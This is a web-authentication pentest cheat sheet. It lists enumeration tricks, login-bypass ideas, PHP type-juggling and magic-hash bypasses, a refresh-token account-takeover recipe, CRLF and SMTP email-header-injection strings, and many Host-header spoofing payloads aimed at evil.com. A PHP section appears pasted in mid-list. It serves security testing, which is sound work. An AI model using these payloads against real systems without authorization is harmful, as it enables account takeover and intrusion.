# **🔍 Information Gathering & Enumeration**

### ✅ **Verbose Error Messages**

- Look for error messages that reveal valid usernames, email formats, or system behavior.
    
- Compare responses for:
    
    - Invalid email vs. valid email but wrong password.
    - Nonexistent vs. existing users.
- you can add multiple credentials:
    
    ```
    {
    "username": "carlos",
    "password": ["Hh123123","Hh123123"]
    }
    
    {
    "username": "carlos",
    "password[password]": "Hh123123"
    }
    
    {
    "username": "carlos",
    "password": {"password":"Hh123123"}
    }
    ```
    

### ✅ **Username Enumeration**

- Check if usernames are non-unique.
- If the app generates usernames, create multiple accounts and analyze patterns.

### ✅ **Forgot Password Analysis**

- Request multiple password reset links and look for predictable patterns.

### ✅ **Account Activation Links**

- Try using activation links multiple times.
- Request multiple activation URLs and check for predictable structures.

---

## **🔓 Login Bypass & Manipulation**

### ✅ **Testing Login with Missing or Empty Data**

- Attempt login with **no username and password**.
- Try using **empty strings** as values.
- **Remove parameters** entirely and observe behavior.

### ✅ **Redirect URL Tampering**

- Modify redirect parameters in requests to test for open redirection or authentication bypass.

Here's your organized reference:

## ✅ PHP Type Juggling Cheat Sheet

### Comparison Rules (`==`)

|Operand 1|Operand 2|Behavior|
|---|---|---|
|`string`|`string`|Numerical or lexical comparison|
|`null`|`string`|Convert `null` to `""`|
|`null`|anything but `string`|Convert both to `bool`|
|`bool`|anything|Convert both to `bool`|
|`int`|`string`|Convert `string` to `int`|
|`float`|`string`|Convert `string` to `float`|

### Magic Hashes

Any hash starting with `0e` followed by only digits equals `0` under loose comparison:

```
"0e529201492" == "0e137951649" == 0  → TRUE
```

**Attack strategy:**

1. Make the target hash start with `0e`
2. Brute-force your input until your hash also starts with `0e`
3. Both evaluate to `0` → bypass

### Common Bypass Payloads

|Payload|Type|Loose-equals|
|---|---|---|
|`0`|int|`"0e..."`, `""`, `null`, `false`|
|`1`|int|`"1abc"`, `true`|
|`-1`|int|`"-1abc"`|
|`true`|bool|any non-empty string|
|`false`|bool|`""`, `null`, `0`, `[]`|
|`null`|null|`""`, `0`, `false`|
|`""`|string|`null`, `false`|
|`"php"`|string|`true`, any non-numeric string|
|`[]`|array|`false`, `null`|

### Quick Reference

```php
"0e123"  == 0      → TRUE  (scientific notation)
"1"      == true   → TRUE  (cast to bool)
""       == false  → TRUE  (empty = false)
"0"      == false  → TRUE  (zero = false)
null     == false  → TRUE
[]       == false  → TRUE
"php"    == true   → TRUE  (non-empty string)
```

### The Fix

```php
// ❌ Vulnerable
$mac == custom_hmac($dir, $nonce)

// ✅ Safe
$mac === custom_hmac($dir, $nonce)
```

`===` enforces strict type + value equality — no coercion.
### ✅ **Skipping Steps in Multi-Step Login**

- Try jumping to later authentication steps without completing previous ones.
- Directly access authenticated pages without logging in.

### ✅ **Resubmitting Authentication Requests**

- Capture login requests and resend them with:
    - Different values.
    - Modified parameters.
    - Duplicate parameters.

### ✅ **Bypass “Email Already Exists”**

- Create same email but captial letter
- %00
- Add %20 to bypass email already exist
- SSO logins via okta or auth0

---

## **⚙️ Parameter Manipulation & Edge Cases**

### ✅ Token refresh


Refresh Token Endpoint Misconfiguration Leads to ATO

- **vuln Explain**
    
    In this case, once a user logged into the application with valid credentials, it created a `Bearer Authentication token` used elsewhere in the application.
    
    This auth token expired after some time. Just before expiration, the application sent a request to the back-end server within the endpoint `/*refresh/tokenlogin*` containing the `valid auth token` in the headers and `username parameter` on the HTTP body section.
    
    Further testing revealed that deleting `_Authorization header_` on the request and changing the `_username_` parameter on the HTTP body created a new valid token for the supplied `username`. Using this exploit, an attacker with an anonymous profile could generate an authentication token for any user by just supplying their username.
    

Steps

1. Find Refresh Token Endpoint
    
2. Remove Bearer Header
    
3. change username
    
4. Get the token for any user in response

### ✅ **Replay Authentication Requests**

- Resend login requests to check for potential replay vulnerabilities.

---

## **🔑 MFA & Password Security**

### ✅ **Multi-Factor Authentication (MFA) Testing**

- Try bypassing MFA by accessing protected resources directly.
- Check if backup codes are predictable or reused.

### ✅ **Weak Password Policies**

- Test for weak password restrictions by trying:
    - Short passwords.
    - Common passwords (`123456`, `password`, etc.).
    - Reused old passwords.

### ✅ **Generated Password Patterns**

- If the system generates passwords, request multiple and analyze for patterns

---

## 🧪 Email Header Injection Testing (Forgot Password Function)

Use the following tips to test for **email header injection** vulnerabilities in password reset flows.

## 🔥 **Payloads to Try**

---

Replace `<youremail>` with your real email address:

```
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>

%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a

%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a

```

## 🌐 Host Header Injection

these are the override Host Headers 

|                      |
| -------------------- |
| Host                 |
| X-Forwarded-Host     |
| X-Forwarded-Server   |
| X-Forwarded-For      |
| X-Host               |
| X-Original-Host      |
| X-Remote-Host        |
| X-Client-Host        |
| X-HTTP-Host-Override |
| Forwarded            |
| Origin               |
| Referer              |
| X-Original-URL       |
| X-Rewrite-URL        |

```bash
Host: [evil.com](<http://evil.com/>)
Host: [evil.com:8080](<http://evil.com:8080/>)
Host: [evil.com/](<http://evil.com/>)
Host: [evil.com.legitimate.com](<http://evil.com.legitimate.com/>)
Host: [evil.com@legitimate.com](<mailto:evil.com@legitimate.com>)
Host: [evil.com#legitimate.com](<http://evil.com/#legitimate.com>)
Host: 127.0.0.1
Host: localhost
Host: 0.0.0.0
Host: [::1]

X-Forwarded-Host: [evil.com](<http://evil.com/>)
X-Forwarded-Host: [evil.com](<http://evil.com/>), [legitimate.com](<http://legitimate.com/>)
X-Forwarded-Host: [evil.com](<http://evil.com/>)%[00legitimate.com](<http://00legitimate.com/>)
X-Forwarded-Host: evil%2ecom
X-Forwarded-Host: evil%2fcom
X-Forwarded-Host: [evil.com](<http://evil.com/>)%0d%0aAnother-Header: injected
X-Forwarded-Host: [evil.com](<http://evil.com/>)%0d%0aLocation:%20http://evil.com

X-Forwarded-Server: [evil.com](<http://evil.com/>)
X-Forwarded-Server: [evil.com](<http://evil.com/>), [legitimate.com](<http://legitimate.com/>)

X-Host: [evil.com](<http://evil.com/>)
X-Host: [evil.com:443](<http://evil.com:443/>)

X-Forwarded-For: [evil.com](<http://evil.com/>)
X-Forwarded-For: [evil.com](<http://evil.com/>), 127.0.0.1

X-Original-Host: [evil.com](<http://evil.com/>)
X-Original-Host: [evil.com](<http://evil.com/>), [legitimate.com](<http://legitimate.com/>)

X-Remote-Host: [evil.com](<http://evil.com/>)
X-Remote-Host: 127.0.0.1

X-Client-Host: [evil.com](<http://evil.com/>)

Forwarded: [host=evil.com](<http://host=evil.com/>)
Forwarded: [by=evil.com](<http://by=evil.com/>);[host=evil.com](<http://host=evil.com/>);proto=https
Forwarded: [for=evil.com](<http://for=evil.com/>);[host=evil.com](<http://host=evil.com/>)

Origin: [evil.com](<http://evil.com/>)
Origin: [<http://evil.com>](<http://evil.com/>)

Referer: [evil.com](<http://evil.com/>)
Referer: [<http://evil.com>](<http://evil.com/>)

X-Original-URL: /evil.com
X-Rewrite-URL: /evil.com

# Double Headers Trick

Host: [evil.com](<http://evil.com/>)
Host: [legitimate.com](<http://legitimate.com/>)

X-Forwarded-Host: [evil.com](<http://evil.com/>)
X-Forwarded-Host: [legitimate.com](<http://legitimate.com/>)

Forwarded: [host=evil.com](<http://host=evil.com/>)
Forwarded: [host=legitimate.com](<http://host=legitimate.com/>)
```

